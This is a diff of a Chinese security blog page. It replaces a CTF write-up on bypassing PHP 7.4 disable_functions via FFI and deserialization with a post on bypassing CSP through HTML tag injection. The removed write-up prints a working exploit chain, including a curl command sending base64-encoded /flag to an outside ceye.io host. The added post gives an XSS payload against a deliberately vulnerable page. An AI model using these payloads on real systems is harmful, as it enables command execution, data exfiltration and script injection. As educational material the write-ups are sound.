@@ -16,24 +16,22 @@
 
 
 <meta name="description" content="已完结.">
-<meta name="keywords" content="Web安全,PHP">
+<meta name="keywords" content="Web安全,XSS">
 <meta property="og:type" content="article">
-<meta property="og:title" content="从RCTF nextphp看PHP7.4的FFI绕过disable_functions">
-<meta property="og:url" content="https://Mi1k7ea.github.com/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/index.html">
+<meta property="og:title" content="利用HTML注入劫持标签Bypass CSP">
+<meta property="og:url" content="https://Mi1k7ea.github.com/2019/08/18/利用HTML注入劫持标签Bypass-CSP/index.html">
 <meta property="og:site_name" content="Mi1k7ea">
 <meta property="og:description" content="已完结.">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/1.png">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/2.png">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/3.png">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/4.png">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/5.png">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/6.png">
-<meta property="og:updated_time" content="2019-06-07T10:00:41.229Z">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/08/18/利用HTML注入劫持标签Bypass-CSP/1.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/08/18/利用HTML注入劫持标签Bypass-CSP/2.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/08/18/利用HTML注入劫持标签Bypass-CSP/3.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/08/18/利用HTML注入劫持标签Bypass-CSP/4.png">
+<meta property="og:updated_time" content="2019-08-18T05:47:42.276Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="从RCTF nextphp看PHP7.4的FFI绕过disable_functions">
+<meta name="twitter:title" content="利用HTML注入劫持标签Bypass CSP">
 <meta name="twitter:description" content="已完结.">
-<meta name="twitter:image" content="https://mi1k7ea.github.com/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/1.png">
+<meta name="twitter:image" content="https://mi1k7ea.github.com/2019/08/18/利用HTML注入劫持标签Bypass-CSP/1.png">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
@@ -65,7 +63,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>从RCTF nextphp看PHP7.4的FFI绕过disable_functions | Mi1k7ea</title>
+<title>利用HTML注入劫持标签Bypass CSP | Mi1k7ea</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -255,11 +253,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我">
 </nav>
-      <div class="body-wrap"><article id="post-从一道题看PHP7-4的FFI绕过disable-functions" class="article article-type-post" itemscope="" itemprop="blogPost">
+      <div class="body-wrap"><article id="post-利用HTML注入劫持标签Bypass-CSP" class="article article-type-post" itemscope="" itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/" class="article-date">
-      <time datetime="2019-06-07T08:27:45.000Z" itemprop="datePublished">2019-06-07</time>
+      <a href="/2019/08/18/利用HTML注入劫持标签Bypass-CSP/" class="article-date">
+      <time datetime="2019-08-18T04:33:42.000Z" itemprop="datePublished">2019-08-18</time>
 </a>
 
 
@@ -274,7 +272,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      从RCTF nextphp看PHP7.4的FFI绕过disable_functions
+      利用HTML注入劫持标签Bypass CSP
     </h1>
   
 
@@ -283,13 +281,13 @@
       <div class="article-info article-info-post">
         
     <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/PHP/">PHP</a>
+    <a class="article-category-link" href="/categories/Web安全基础/">Web安全基础</a>
     </div>
 
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -299,68 +297,28 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a>0x01 题目分析</h2><p>访问页面，显示源码，是个PHP一句话木马：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>推测，考察Bypass disable_functions。</p>
-<p>通过<code>?a=phpinfo();</code>查看phpinfo，发现PHP版本为7.4，且open_basedir限制为Web目录：</p>
-<p><img src="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/1.png" alt=""></p>
-<p>而disable_functions中不仅过滤了所有PHP命令执行函数，还过滤了mail、dl、putenv等函数：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl</span><br></pre></td></tr></table></figure>
-<p>Bypass disable_functions的方法无非就那几种。黑名单是无法绕过了，因为所有PHP命令执行函数都被严格过滤了；系统是Linux，不存在COM组件绕过；过滤了dl()函数，无法通过扩展库绕过；过滤了mail和putenv等函数，无法通过LD_PRELOAD方式绕过；过滤了pcntl相关函数，无法通过该组件绕过；系统没有ImageMagick组件等等……</p>
-<p>暂时没有思路，那就看下当前Web目录下有啥文件，此时只能查看Web目录，因为open_basedir限制了：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=print_r(scandir(&apos;./&apos;));</span><br></pre></td></tr></table></figure>
-<p><img src="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/2.png" alt=""></p>
-<p>可以看到有个preload.php。</p>
-<p>难道就没办法Bypass open_basedir了吗？——<strong>使用glob://伪协议</strong></p>
-<p>下面通过glob://伪协议来Bypass open_basedir读取根目录有啥内容，发送之前先进行URL编码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=<span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///*"</span>);<span class="keyword">foreach</span>($a <span class="keyword">as</span> $f)&#123;<span class="keyword">echo</span>($f-&gt;__toString().<span class="string">' '</span>);&#125;;</span><br></pre></td></tr></table></figure>
-<p>可以看到根目录下有个flag，这里读是读不到的，但是已经确定了flag在根目录下：</p>
-<p><img src="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/3.png" alt=""></p>
-<p>回到之前，看下preload.php的源码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?a=show_source(&apos;preload.php&apos;);</span><br><span class="line">?a=echo(readfile(&apos;preload.php&apos;));</span><br><span class="line">?a=print_r(readfile(&apos;preload.php&apos;));</span><br><span class="line">?a=echo(file_get_contents(&apos;preload.php&apos;));</span><br><span class="line">?a=print_r(file_get_contents(&apos;preload.php&apos;));</span><br></pre></td></tr></table></figure>
-<p>源码如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'print_r'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'1'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span><span class="params">()</span>: <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span><span class="params">(array $data)</span> </span>&#123;</span><br><span class="line">        array_merge(<span class="keyword">$this</span>-&gt;data, $data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> <span class="params">($key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> <span class="params">($key, $value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>分析下这段代码：A类继承了Serializable类，和Java类似，定义了一个可序列化的类；A类有一个成员变量\$data，是一个数组，数组中是字典，键分别保存了ret、func、arg；新增了__serialize()和__unserialize()函数，未见过的写法，其中__unserialize()和unserialize()均调用了run()函数；__set()和__construct()函数都抛出异常，这里主要是__set()，因为我们无法直接通过set的方式来设置\$data的值了；最后是run()函数，它是反序列化漏洞存在的根源，因为它通过成员变量\$data中的func和arg来实现任意函数调用：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br></pre></td></tr></table></figure>
-<p>至此，之前Bypass disable_functions的方法自然是用不了了。但题目是nextphp，PHP版本为7.4且根据其未见过的一些特性可以推测出应该是用到了7.4版本的新特性了。</p>
-<h2 id="0x02-PHP-7-4-新特性"><a href="#0x02-PHP-7-4-新特性" class="headerlink" title="0x02 PHP 7.4 新特性"></a>0x02 PHP 7.4 新特性</h2><h3 id="自定义对象序列化"><a href="#自定义对象序列化" class="headerlink" title="自定义对象序列化"></a>自定义对象序列化</h3><p>在PHP 7.4的时候，增加了__serialize()和__unserialize()函数，可以用来自定义对象的序列化。其实和Java重写readObject()方法类似。</p>
-<h3 id="Preload"><a href="#Preload" class="headerlink" title="Preload"></a>Preload</h3><p>预加载，允许服务器在启动时在内存中加载PHP文件，并使它们永久可用于所有后续请求，主要用来大幅提升IO性能。</p>
-<p>在php.ini中有一项设置名为opcache.preload，用来指定将在服务器启动时编译和执行的PHP文件，文件中定义的所有函数和大多数类都将永久加载到PHP的函数和类表中，并在将来的任何请求的上下文中永久可用。</p>
-<p>在本题的phpino中可以看到该设置选项：</p>
-<p><img src="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/4.png" alt=""></p>
-<p>可以看到，该选项设置为preload.php，也就是说服务器在启动时就已经将该文件加载进内存中，后续我们可以直接调用该文件中的类方法即可而无需做多余的操作去加载或包含文件进来。</p>
-<h3 id="FFI"><a href="#FFI" class="headerlink" title="FFI"></a>FFI</h3><p>FFI（Foreign Function Interface），即外部函数接口，允许从用户区调用C代码。简单地说，就是一项让你在PHP里能够调用C代码的技术。</p>
-<p>FFI的使用分为声明和调用两个部分。</p>
-<p>下面看个简单的使用Demo，从共享库中调用printf()函数：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// create FFI object, loading libc and exporting function printf()</span></span><br><span class="line">$ffi = FFI::cdef(</span><br><span class="line">    <span class="string">"int printf(const char *format, ...);"</span>, <span class="comment">// this is a regular C declaration</span></span><br><span class="line">    <span class="string">"libc.so.6"</span>);</span><br><span class="line"><span class="comment">// call C's printf()</span></span><br><span class="line">$ffi-&gt;printf(<span class="string">"Hello %s!\n"</span>, <span class="string">"world"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>FFI::cdef——创建一个新的FFI对象，可以用于常规C代码的声明，第一个参数为需要声明的C代码，第二个参数为可选项、从哪个共享库中导入；后面直接通过FFI变量调用声明过的C函数即可。</p>
-<p>可在phpinfo中查看FFI是否开启，本题是开启的：</p>
-<p><img src="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/5.png" alt=""></p>
-<h2 id="0x03-解题思路"><a href="#0x03-解题思路" class="headerlink" title="0x03 解题思路"></a>0x03 解题思路</h2><p>由前面分析可知以下几点可利用的地方：</p>
-<ul>
-<li>Preload配置已经将preload.php预加载到内存中，可直接利用其中的类方法；</li>
-<li>preload.php中的unserialize()函数会调用run()，而run()存在任意函数调用风险；</li>
-<li>index.php中eval会执行PHP代码，会帮助我们执行preload.php中的反序列化操作；</li>
-</ul>
-<p>结合起来，攻击思路如下：</p>
-<ul>
-<li>先利用FFI特性构造恶意序列化内容，用PHP通过FFI声明和调用C中的system()函数；</li>
-<li>利用index.php中的eval来执行反序列化操作；</li>
-<li>最后调用FFI中声明的system()函数执行命令；</li>
-</ul>
-<p>利用FFI的特性构造恶意序列化内容，因为无法直接通过__set()函数设置成员变量\$data，这里就直接修改其键值即可，使其初始化func的初始值为FFI::cdef、arg的初始值为system：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'FFI::cdef'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'int system(char *command);'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(serialize(<span class="keyword">new</span> A()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>得到如下序列化内容：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:1:&quot;A&quot;:89:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:26:&quot;int system(char *command);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p>构造exp如下，这里利用index.php的eval来限制执行反序列化操作，然后触发run()函数来调用FFI::cdef声明C中的system()函数，然后通过FFI变量调用已声明的system()来执行任意命令，因为可能有特殊编码这里就进行base64加密传送回来：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=unserialize(<span class="string">'C:1:"A":89:&#123;a:3:&#123;s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:26:"int system(char *command);";&#125;&#125;'</span>);$a-&gt;ret-&gt;system(<span class="string">'curl xx.ceye.io/?c=`cat /flag|base64`'</span>);</span><br></pre></td></tr></table></figure>
-<p>发送之前，先进行URL编码，最后在ceye收到内容，base64解码即为flag：</p>
-<p><img src="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/6.png" alt=""></p>
-<p><strong>小结</strong></p>
-<p>本题巧妙利用了PHP 7.4的新特性FFI来Bypass disable_functions。</p>
-<p>当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions。</p>
-<p>也就是说，通过PHP调用C的命令执行函数来绕过。</p>
-<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://www.php.net/manual/en/book.ffi.php" target="_blank" rel="noopener">Foreign Function Interface</a></p>
+        <h2 id="0x01-以往劫持方法的局限性"><a href="#0x01-以往劫持方法的局限性" class="headerlink" title="0x01 以往劫持方法的局限性"></a>0x01 以往劫持方法的局限性</h2><p>在之前的一篇博文<a href="https://www.mi1k7ea.com/2019/02/21/一道绕过CSP的XSS题目/" target="_blank" rel="noopener">《一道绕过CSP的XSS题目》</a>中提到了一种绕过CSP的方法，就是利用JS的特性，通过劫持指定id的标签来实现注入的JS代码能执行。但是这种方法的局限性是十分明显的——<strong>即进行劫持注入的地方必须在被劫持的标签的前面</strong>，因为浏览器只会从上至下地解析标签，当页面中存在多个相同id的标签的时，浏览器只会解析第一个标签，如果我们注入的位置在后面，那么将无法成功劫持到该标签。</p>
+<p>看之前的图就知道了：</p>
+<p><img src="/2019/08/18/利用HTML注入劫持标签Bypass-CSP/1.png" alt=""></p>
+<p>我们想劫持的是id为yourname的标签，而我们能够注入的点是id为forminput的标签，可以看到能够注入的标签是在被劫持的标签的前面，所以我们能够成功劫持到id为yourname的标签。</p>
+<h2 id="0x02-HTML标签注入"><a href="#0x02-HTML标签注入" class="headerlink" title="0x02 HTML标签注入"></a>0x02 HTML标签注入</h2><p>如果情况变为了，我们可以注入的点在想被劫持的标签后面，那么我们通过之前的办法还能不能劫持成功？</p>
+<p>我们看个例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$nonce = md5(openssl_random_pseudo_bytes(16));</span><br><span class="line">header(&quot;Content-Security-Policy: script-src &apos;nonce-$nonce&apos; &apos;unsafe−eval&apos;; &quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;CSP Test&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=&quot;template_target&quot;&gt;Mi1k7ea&apos;s blog: &lt;/div&gt;</span><br><span class="line">&lt;script type=&quot;application/template&quot; id=&quot;template&quot;&gt;https://www.mi1k7ea.com/&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">Your search is &lt;?php if(isset($_GET[&apos;q&apos;]))&#123;echo $_GET[&apos;q&apos;];&#125; else &#123;echo &apos;empty, but you can input a param called q.&apos;;&#125; ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;script nonce=&lt;?php echo $nonce;?&gt;&gt;</span><br><span class="line">	let template = document.getElementById(&apos;template&apos;);</span><br><span class="line">	template_target.innerHTML = template.innerText.replace(/&#123;&#123;(.*)&#125;&#125;/g,eval)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>代码很简单，这里模拟的是模板文件的形式，CSP策略设置为<code>script-src &#39;nonce-xxx&#39; &#39;unsafe−eval&#39;;</code>，正常注入XSS payload是执行不成功的，唯一的可利用点是script标签中的eval、它会执行成功正则匹配到的两对大括号里面的内容，但限定了其执行的位置是id为template的标签。</p>
+<p>显而易见，我们希望能够劫持的是id为template的标签，因为该标签中的内容会被正则匹配到之后调用eval执行JS代码，但是问题也很明显我们输入的注入点就在id为template的script标签的下面，并不能成功劫持到该标签，我们这里可以试试看，我们注入id为template的div标签，其中内容为符合正则匹配的JS弹框代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?q=&lt;div id=&quot;template&quot;&gt;&#123;&#123; alert(&apos;html inject hack&apos;) &#125;&#125;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/08/18/利用HTML注入劫持标签Bypass-CSP/2.png" alt=""></p>
+<p>标签是注入了，id也是template，但是是处于id为template的script标签下面，可以看到并没有触发弹框，因为浏览器只解析了排在前面的第一个id为template的标签。</p>
+<p>那么如何去实现劫持呢？——<strong>通过注入HTML标签实现劫持</strong>。</p>
+<p>我们换个标签，将div换成html标签：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?q=&lt;html id=&quot;template&quot;&gt;&#123;&#123; alert(&apos;html inject hack&apos;) &#125;&#125;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/08/18/利用HTML注入劫持标签Bypass-CSP/3.png" alt=""></p>
+<p>Bingo，成功弹框，我们看下页面元素看下为啥能够成功劫持：</p>
+<p><img src="/2019/08/18/利用HTML注入劫持标签Bypass-CSP/4.png" alt=""></p>
+<p>可以看到，我们注入的id为template的HTML标签，被浏览器解析到当前页面DOM文档的顶部去了，整个页面的HTML标签中的内容都属于id为template的标签内容内，因此其中符合正则匹配的内容都会被匹配到并成功执行。</p>
+<p>通过注入HTML标签的方式，我们就可以由在需劫持的标签下面的位置上升为全局的劫持的位置，从而让我们在全局的层面实现了劫持！</p>
+<p>当然，这段HTML标签注入的payload，我在本地的Chrome、IE和360浏览器这些是能够触发成功的，但Firefox不能弹框，然而查看这些浏览器的页面元素都是一样的，至于触发与否应该就是不同浏览器不同机制的原因了。除此之外，这种劫持方法的利用场景在模板文件中会更容易出现。</p>
+<h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://pagedout.institute/download/PagedOut_001_beta1.pdf" target="_blank" rel="noopener">PagedOut_001_beta1.pdf 第62页</a></p>
 
       
     </div>
@@ -369,13 +327,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/">从RCTF nextphp看PHP7.4的FFI绕过disable_functions</a></p>
+        <p><span>本文标题:</span><a href="/2019/08/18/利用HTML注入劫持标签Bypass-CSP/">利用HTML注入劫持标签Bypass CSP</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Mi1k7ea</a></p>
-        <p><span>发布时间:</span>2019-06-07, 16:27:45</p>
-        <p><span>最后更新:</span>2019-06-07, 18:00:41</p>
+        <p><span>发布时间:</span>2019-08-18, 12:33:42</p>
+        <p><span>最后更新:</span>2019-08-18, 13:47:42</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/" title="从RCTF nextphp看PHP7.4的FFI绕过disable_functions">https://Mi1k7ea.github.com/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/</a>
-            <span class="copy-path" data-clipboard-text="原文: https://Mi1k7ea.github.com/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/　　作者: Mi1k7ea" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/08/18/利用HTML注入劫持标签Bypass-CSP/" title="利用HTML注入劫持标签Bypass CSP">https://Mi1k7ea.github.com/2019/08/18/利用HTML注入劫持标签Bypass-CSP/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://Mi1k7ea.github.com/2019/08/18/利用HTML注入劫持标签Bypass-CSP/　　作者: Mi1k7ea" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
